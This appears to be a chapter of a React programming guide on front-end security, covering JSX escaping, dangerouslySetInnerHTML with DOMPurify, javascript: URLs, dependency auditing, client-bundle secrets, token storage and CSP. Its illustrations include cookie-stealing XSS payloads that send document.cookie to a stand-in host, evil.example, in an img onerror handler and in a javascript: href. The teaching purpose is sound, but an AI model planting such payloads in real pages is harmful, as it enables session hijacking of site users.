# 25 — Security

React's default JSX rendering escapes values automatically, which quietly prevents the most common web vulnerability (cross-site scripting) for the overwhelming majority of everyday rendering. That default protection creates a false sense of blanket safety, though — a handful of specific APIs deliberately opt out of it, dependencies introduce their own vulnerabilities regardless of how safely application code is written, and a client-side bundle is fundamentally public in a way that's easy to forget while writing it. This chapter covers where React's automatic protection ends and a developer's own vigilance has to begin.

## JSX's Automatic Escaping (and Its Limits)

Every value interpolated into JSX via `{}` is escaped before being inserted into the DOM — a string containing `<script>` renders as the literal, inert text `<script>`, not as an executed script tag.

::code-wrapper{language="javascript"}
```javascript
function Comment({ text }) {
  // If `text` is "<img src=x onerror=alert('xss')>", React renders it as
  // the literal, harmless text string, NOT as a live img tag — this is safe by default
  return <p>{text}</p>
}
```
::

This automatic escaping is the reason React applications are, by default, meaningfully more resistant to XSS than hand-written DOM manipulation (`element.innerHTML = userInput`) — the protection isn't something a developer has to remember to apply, it's the normal, unavoidable behavior of rendering a value through JSX. The protection has a well-defined boundary, though: it applies to text content and to most attribute values, but does not apply to a small set of APIs that exist specifically to bypass it.

## `dangerouslySetInnerHTML`: The Explicit Escape Hatch

React's name choice for this prop is deliberate and not merely a suggestion to be careful — `dangerouslySetInnerHTML` inserts a raw HTML string directly into the DOM exactly as `innerHTML` would, with none of JSX's automatic escaping applied.

::code-wrapper{language="javascript"}
```javascript
// DANGEROUS if `comment.body` can contain attacker-controlled content: any
// <script>, onerror handler, or javascript: URL in the string executes as-is
function CommentDisplay({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.body }} />
}
```
::

If `comment.body` originates from user input — a comment field, a bio, a chat message, anything not authored and controlled entirely by the application's own team — this is a directly exploitable stored XSS vulnerability: an attacker submits a comment containing `<img src=x onerror="fetch('https://evil.example/steal?cookie=' + document.cookie)">`, and that script executes in every other user's browser the moment they view the comment, with the same access to cookies, local storage, and API calls the legitimate page has.

The legitimate use case for `dangerouslySetInnerHTML` is rendering HTML the application controls the *source* of — markdown rendered to HTML server-side, a CMS's rich-text output, syntax-highlighted code from a trusted highlighting library — never raw, unprocessed user input.

::code-wrapper{language="javascript"}
```javascript
import DOMPurify from 'dompurify'

// SAFE: DOMPurify strips dangerous tags/attributes (script tags, event handler
// attributes, javascript: URLs) before the string ever reaches the DOM,
// while preserving legitimate formatting markup (bold, links, lists, etc.)
function CommentDisplay({ comment }) {
  const clean = DOMPurify.sanitize(comment.body)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```
::

Sanitizing on the client with a maintained library like **DOMPurify** is the standard mitigation when rendering user-generated HTML is genuinely required (a rich-text editor's output, for instance) — hand-rolling a sanitizer with a regex or a denylist of "dangerous" tags is not a safe substitute, since the space of HTML/JavaScript injection techniques (unusual encodings, obscure tag/attribute combinations, mutation-based XSS) is large and constantly evolving, and a maintained library tracks that evolving threat landscape in a way a one-off regex cannot.

## `href` and `javascript:` URLs

A less obvious injection vector: an `href` or `src` attribute whose value is user-controlled can itself carry executable code via a `javascript:` URL scheme, bypassing the need for `dangerouslySetInnerHTML` entirely.

::code-wrapper{language="javascript"}
```javascript
// DANGEROUS: if `link.url` is attacker-controlled and equals
// "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
// clicking this anchor executes that script — no dangerouslySetInnerHTML needed at all
function ProfileLink({ link }) {
  return <a href={link.url}>{link.label}</a>
}
```
::

::code-wrapper{language="javascript"}
```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin)
    return parsed.protocol === 'http:' || parsed.protocol === 'https:'
  } catch {
    return false
  }
}

function ProfileLink({ link }) {
  return isSafeUrl(link.url)
    ? <a href={link.url}>{link.label}</a>
    : <span>{link.label}</span>
}
```
::

Modern React (18+) does log a console warning for an obvious `javascript:` string in `href`, but that warning is a development-time nicety, not a security control an application should rely on — validating that a user-supplied URL's protocol is actually `http:`/`https:` (or another explicitly expected scheme) before rendering it as a link is the actual mitigation, since the warning doesn't block the render or the click, and more obfuscated payloads may not trigger it at all.

## Dependency Vulnerabilities

React's own escaping and a careful application codebase account for only one axis of risk — a typical production app pulls in hundreds of transitive dependencies, any one of which can carry a known vulnerability or, in a supply-chain attack, malicious code inserted directly into a package the application already trusts.

::code-wrapper{language="bash"}
```bash
npm audit
# reports known vulnerabilities in installed dependencies, with severity levels
# and, where available, a fixed version to upgrade to

npm audit fix
# attempts to automatically upgrade to non-breaking fixed versions

npm audit fix --force
# will upgrade across breaking major versions if that's the only available fix —
# review the resulting diff and changelog before trusting this blindly
```
::

`npm audit` (or `pnpm audit`/`yarn audit`) should run as part of CI, not just occasionally by hand — a dependency that was safe when first installed can have a vulnerability disclosed months later, and nothing about the application's own code changes to surface that; only re-checking the dependency tree does. Automated tools like **Dependabot** or **Renovate** open pull requests automatically when a dependency has a known fix available, turning "someone has to remember to run `npm audit` periodically" into a process that happens without relying on memory.

::code-wrapper{language="json"}
```json
{
  "name": "product-catalog",
  "dependencies": {
    "react": "^18.3.0",
    "react-dom": "^18.3.0"
  },
  "overrides": {
    "some-transitive-dep": "^2.1.4"
  }
}
```
::

The `overrides` field (or `resolutions` in Yarn) forces a specific version of a *transitive* dependency — one pulled in indirectly by a direct dependency, not listed in `package.json` directly — which is often the only way to patch a vulnerability that lives several levels deep in the dependency tree, while the direct dependency that requires it hasn't yet released an update pinning the fixed version itself.

## Secrets Do Not Belong in Client Bundles

Anything shipped to the browser — including every environment variable a bundler embeds into client code at build time — is fully readable by anyone who opens DevTools, views page source, or simply downloads the JavaScript bundle directly. There is no client-side mechanism, obfuscation technique, or minification level that changes this.

::code-wrapper{language="javascript"}
```javascript
// DANGEROUS: this API key, once bundled, is visible in plain text to anyone
// who opens the browser's Network tab or views the downloaded JS bundle —
// "it's minified" provides zero actual protection, it's trivially readable either way
const STRIPE_SECRET_KEY = 'sk_live_51H8xJ2...'

function processPayment(amount) {
  return fetch('https://api.stripe.com/v1/charges', {
    headers: { Authorization: `Bearer ${STRIPE_SECRET_KEY}` },
    body: JSON.stringify({ amount }),
  })
}
```
::

::code-wrapper{language="javascript"}
```javascript
// SAFE: the client calls the application's OWN backend, which holds the real
// secret key server-side and is never shipped to any browser at all
function processPayment(amount) {
  return fetch('/api/checkout', {
    method: 'POST',
    body: JSON.stringify({ amount }),
  })
}
```
::

The rule of thumb: anything with write access, billing implications, or broad read access to sensitive data (a database admin key, a payment provider's *secret* key, an email-sending API key) belongs exclusively on a server the client never sees — the client calls that server's own API, and the server holds the real credential. A *publishable* or scoped, rate-limited key explicitly designed for client-side exposure (Stripe's publishable key, a map provider's domain-restricted API key) is a different, legitimately safe category, but the distinction between "publishable" and "secret" matters enormously and is spelled out explicitly in the documentation of any credential-issuing service worth using.

::code-wrapper{language="bash"}
```bash
# .env (bundler-specific prefix conventions vary — this is Vite's)
VITE_STRIPE_PUBLISHABLE_KEY=pk_live_51H8xJ2...     # fine to expose — read-only, scoped by design
STRIPE_SECRET_KEY=sk_live_51H8xJ2...               # must NEVER be prefixed for client exposure —
                                                     # keep it server-side only, read via server code
```
::

Most bundlers (Vite, Create React App, Next.js) require an explicit prefix (`VITE_`, `REACT_APP_`, `NEXT_PUBLIC_`) for an environment variable to be embedded into the client bundle at all — this convention exists specifically as a guardrail, making "will this leak to the browser" an explicit, visible decision in the variable's own name rather than an easy-to-miss default. An unprefixed variable stays server-only in these setups precisely so that reaching for the client-exposed version requires a deliberate, visible choice.

## Storing Tokens: `localStorage` vs. Cookies

Where an authentication token is stored has real security implications, and the common default (`localStorage`, chosen for its convenience) is not the safest option.

::code-wrapper{language="javascript"}
```javascript
// Common, but exposes the token to ANY script running on the page —
// including a successful XSS payload from a dependency, an ad, or a
// missed sanitization gap anywhere else in the app
localStorage.setItem('authToken', token)
```
::

A token in `localStorage` is readable by any JavaScript running in that page's origin — which means a single successful XSS vulnerability anywhere in the app (or in a third-party script it loads) can exfiltrate every logged-in user's auth token directly. An `httpOnly` cookie, set by the server and never touched by client-side JavaScript at all, is not readable by `document.cookie` or any script, which meaningfully limits what a successful XSS payload can steal even if one does occur.

::code-wrapper{language="javascript"}
```javascript
// Server-side (conceptual — Express-style), not client React code:
// res.cookie('authToken', token, { httpOnly: true, secure: true, sameSite: 'strict' })
//
// The client never reads or stores this token directly at all — it's sent
// automatically by the browser on every request to the same origin, and is
// invisible to JavaScript, including a successful XSS payload's JavaScript
```
::

`httpOnly` cookies trade one risk for a different one — they need `sameSite`/CSRF protection instead of being vulnerable to token theft via XSS — so the right choice depends on an application's specific threat model, but the common, convenience-driven default of `localStorage` is worth a deliberate second look rather than an unexamined default, specifically because of how directly it amplifies the blast radius of any XSS bug elsewhere in the app.

## Content Security Policy: Defense in Depth

A Content Security Policy (CSP), set via an HTTP response header, tells the browser which sources of scripts, styles, and other resources are allowed to load at all — it doesn't prevent an XSS bug from existing in application code, but it can prevent that bug from being *exploitable*, by refusing to execute injected inline scripts even if one makes it into the DOM.

::code-wrapper{language="ini"}
```ini
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example; object-src 'none'
```
::

With a policy like this in place, even a successful injection of `<script>alert(1)</script>` into the DOM (via a missed `dangerouslySetInnerHTML` sanitization gap, for instance) fails to execute, because the browser refuses to run inline scripts not explicitly allowed by the policy — CSP is a genuine second layer of defense specifically for the case where the first layer (careful sanitization) has a gap somewhere the developer didn't anticipate, rather than a substitute for sanitizing input correctly in the first place.

## 💡 Tips & Tricks

- **Safety** — Treat `dangerouslySetInnerHTML` as a signal to stop and sanitize, every single time — reach for DOMPurify (or equivalent) rather than a hand-rolled regex/denylist, since the space of HTML/JS injection techniques is large and evolves faster than a one-off sanitizer can track.
- **Safety** — Validate a user-supplied URL's protocol (`http:`/`https:` only, typically) before rendering it in `href`/`src` — React's development-mode `javascript:` warning is a nicety, not an enforced security control, and doesn't block the render.
- **Idiom** — Run `npm audit` (or the pnpm/yarn equivalent) in CI, and set up Dependabot or Renovate so dependency vulnerabilities surface automatically over time rather than depending on someone remembering to check periodically.
- **Safety** — Never assume a bundler's minification or tree-shaking hides a secret embedded in client code — anything in the shipped JavaScript bundle is fully and trivially readable by anyone who opens DevTools' Network or Sources tab.
- **Safety** — Prefer `httpOnly` cookies over `localStorage` for authentication tokens where feasible — a token in `localStorage` is readable by any script on the page, meaningfully widening the blast radius of any single XSS vulnerability elsewhere in the app or its dependencies.

## ⚠️ Edge Cases & Gotchas

- **JSX's automatic escaping only covers rendering values through `{}` in normal JSX — it does not extend to `dangerouslySetInnerHTML`, raw DOM manipulation via a ref (`node.innerHTML = ...`), or URLs passed to `href`/`src`** — these are the specific places React's default protection doesn't reach, and each needs its own explicit handling.
- **A `javascript:` URL injected via `href` executes with no `dangerouslySetInnerHTML` involved at all** — this is easy to overlook because it doesn't look like "rendering HTML," but a clicked anchor with an attacker-controlled `javascript:` href runs script exactly as directly as an injected `<script>` tag would.
- **An unprefixed environment variable is server-only by a bundler's convention, not by a hard technical guarantee independent of that convention** — a misconfigured build step, a debugging `console.log(process.env)` left in client code, or a bundler plugin that inlines more than intended can still leak a variable a developer assumed was safely server-side.
- **Bundle minification and obfuscation provide zero actual confidentiality for embedded secrets** — a minified variable name (`a` instead of `stripeSecretKey`) is trivially traceable back to its literal string value in the Sources tab; minification changes readability of code structure, not the visibility of string literals it contains.
- **`npm audit fix --force` can silently introduce breaking changes across major version bumps while "fixing" a vulnerability** — always review the resulting diff, changelog, and run the test suite afterward, rather than trusting an automated fix blindly just because the vulnerability count went to zero.

## 🧠 Spot the Bug

A team adds a "bio" field to user profiles, letting users write a short bio with basic formatting (bold, links). The feature ships, and shortly after, several users report their sessions being logged out unexpectedly and unrecognized charges appearing on their accounts.

::code-wrapper{language="javascript"}
```javascript
function UserBio({ user }) {
  return (
    <div className="bio">
      <div dangerouslySetInnerHTML={{ __html: user.bio }} />
    </div>
  )
}
```
::

<details>
<summary>Answer</summary>

`user.bio` is rendered via `dangerouslySetInnerHTML` with no sanitization at all — any HTML a user types into their own bio field, including `<script>` tags or `onerror`-bearing image tags, is inserted directly into the DOM and executed in the browser of every other user who views that profile. An attacker sets their bio to something like `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`, and the moment anyone else's browser renders that profile, the payload runs with that viewer's own cookies and session — exactly the mechanism behind the reported logouts and unauthorized charges, both consistent with a stolen session token being replayed by the attacker.

**The lesson**: `dangerouslySetInnerHTML` must never render unsanitized user input, even for a seemingly low-stakes field like a bio — the fix is running `user.bio` through a maintained sanitizer (`DOMPurify.sanitize(user.bio)`) before it ever reaches `dangerouslySetInnerHTML`, which strips dangerous tags/attributes while preserving legitimate formatting markup like bold and links.

</details>

## Key Takeaways

- JSX escapes interpolated values by default, which prevents the most common XSS vector automatically — but this protection has explicit, well-defined limits: `dangerouslySetInnerHTML`, raw DOM manipulation, and URLs rendered into `href`/`src` all bypass it.
- Never pass unsanitized user input to `dangerouslySetInnerHTML` — use a maintained sanitizer like DOMPurify, never a hand-rolled regex or denylist.
- Validate that user-supplied URLs use an expected protocol (`http:`/`https:`) before rendering them as links — a `javascript:` URL executes on click with no `dangerouslySetInnerHTML` needed.
- Run dependency vulnerability scanning (`npm audit`, Dependabot/Renovate) continuously in CI, not as an occasional manual check — a dependency safe at install time can have a vulnerability disclosed later with no code change on the application's part.
- Anything embedded in a client bundle, including environment variables a bundler inlines, is fully readable by anyone — secret keys, admin credentials, and anything with write/billing access must live server-side only, called through the application's own backend.
- `localStorage`-stored auth tokens are readable by any script on the page, including a successful XSS payload — `httpOnly` cookies (with CSRF protection) meaningfully reduce that specific blast radius, and a Content Security Policy adds a further layer that can stop an injected script from executing even if a sanitization gap slips through.
